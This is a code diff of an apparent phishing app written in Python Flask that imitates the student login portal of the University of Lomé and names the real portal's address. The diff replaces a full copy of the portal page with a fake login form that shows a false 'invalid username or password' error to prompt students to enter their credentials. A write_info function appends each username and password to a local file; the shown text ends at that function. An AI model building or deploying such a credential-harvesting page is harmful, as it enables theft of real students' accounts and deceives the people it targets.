@@ -3,163 +3,80 @@ import requests
 
 app = Flask(__name__)
 true_site = 'https://etu.univ-lome.tg'
+page = """
+        <!DOCTYPE html>
+        <html lang="fr">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Portail Université</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    background-color: #f4f4f4;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                }
+                .container {
+                    background-color: #fff;
+                    padding: 20px;
+                    border-radius: 8px;
+                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                    width: 300px;
+                    text-align: center;
+                }
+                input[type="text"], input[type="password"] {
+                    width: 100%;
+                    padding: 10px;
+                    margin: 10px 0;
+                    border-radius: 4px;
+                    border: 1px solid #ccc;
+                }
+                input[type="submit"] {
+                    background-color: #4CAF50;
+                    color: white;
+                    padding: 10px;
+                    width: 100%;
+                    border: none;
+                    border-radius: 4px;
+                    cursor: pointer;
+                }
+                button:hover {
+                    background-color: #45a049;
+                }
+                .error {
+                    color: red;
+                    margin-bottom: 10px;
+                }
+            </style>
+        </head>
+        <body>
+        
+        <div class="container">
+            <h2>Connexion</h2>
+            <div class="error">Identifiant ou mot de passe invalide</div>
+            <form action=/login method="post">
+                <input type="text" name="username" placeholder="Identifiant" required>
+                <input type="password" name="password" placeholder="Mot de passe" required>
+                <input type="submit" value="connexion">
+            </form>
+            <br>
+            <a href="#">Mot de passe oublié</a>
+            <br>
+            <a href="#">Identifiant oublié</a>
+        </div>
+        
+        </body>
+        </html>
+"""
 
 
 @app.route('/')
 def home():
-    return '''
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portail Académique de l'Université de Lomé</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f4f4f4;
-        }
-
-        .header {
-            background-color: #7e278b;
-            color: white;
-            padding: 10px;
-            text-align: center;
-        }
-
-        .container {
-            display: flex;
-            margin: 0 auto;
-            max-width: 1200px;
-            padding: 20px;
-        }
-
-        .sidebar {
-            width: 20%;
-            background-color: white;
-            padding: 15px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .sidebar ul {
-            list-style-type: none;
-            padding: 0;
-        }
-
-        .sidebar ul li {
-            padding: 10px 0;
-        }
-
-        .sidebar ul li a {
-            text-decoration: none;
-            color: #333;
-        }
-
-        .main-content {
-            width: 80%;
-            padding: 20px;
-            background-color: #e8f5e9;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-
-        .main-content h2 {
-            margin-top: 0;
-        }
-
-        .login-box {
-            background-color: #c8e6c9;
-            padding: 20px;
-            border-radius: 5px;
-            display: inline-block;
-        }
-
-        .login-box input[type="text"],
-        .login-box input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-
-        .login-box input[type="submit"] {
-            background-color: #43a047;
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .login-box .error-message {
-            color: #d32f2f;
-            margin-bottom: 10px;
-        }
-
-        .top-right {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            text-align: right;
-        }
-
-        .top-right img {
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            margin-left: 10px;
-            vertical-align: middle;
-        }
-    </style>
-</head>
-<body>
-    <div class="header">
-        <h1>Portail Académique de l'Université de Lomé</h1>
-    </div>
-
-    <div class="container">
-        <div class="sidebar">
-            <ul>
-                <li><a href="#">Accueil</a></li>
-                <li><a href="#">Données personnelles</a></li>
-                <li><a href="#">Demande d'inscription</a></li>
-                <li><a href="#">Demande de réorientation</a></li>
-                <li><a href="#">COUL</a></li>
-                <li><a href="#">Unités d'enseignement</a></li>
-                <li><a href="#">Paiements</a></li>
-                <li><a href="#">Fiche d'inscription</a></li>
-                <li><a href="#">Soutenance</a></li>
-                <li><a href="#">Notes</a></li>
-                <li><a href="#">Demande de documents</a></li>
-                <li><a href="#">Cursus</a></li>
-                <li><a href="#">Stages</a></li>
-                <li><a href="#">Projet Galilée</a></li>
-            </ul>
-        </div>
-
-        <div class="main-content">
-            <h2>Connexion</h2>
-            <div class="login-box">
-                <div class="error-message">Identifiant ou mot de passe invalide</div>
-                <form action="/login" method="post">
-                    <input type="text" name="username" placeholder="Identifiant" value="">
-                    <input type="password" name="password" placeholder="Mot de passe">
-                    <input type="submit" value="Connexion">
-                </form>
-                <a href="#">Mot de passe oublié</a> | <a href="#">Identifiant oublié</a>
-            </div>
-        </div>
-    </div>
-
-    <div class="top-right">
-        Connexion: <img src="profile-pic.png" alt="Profile Picture">
-    </div>
-</body>
-</html>
-    '''
+    return page
 
 def write_info(username, password):
     with open("./info.txt", 'a') as f:
